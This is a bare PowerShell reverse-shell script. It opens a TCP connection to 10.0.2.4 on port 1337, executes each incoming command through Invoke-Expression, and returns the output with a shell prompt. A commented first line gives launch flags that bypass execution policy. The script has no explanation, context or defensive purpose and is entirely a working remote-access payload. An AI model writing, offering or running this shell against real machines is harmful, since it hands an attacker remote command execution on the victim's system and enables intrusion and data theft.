#powershell -NoP -NonI -Exec Bypass -Command
$ip = '10.0.2.4'
$port = 1337
$client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($len = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{ 
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$len); $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $encoding = 'ASCII';
    $sendbyte = ([text.encoding]::$encoding).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
}; 
$client.Close();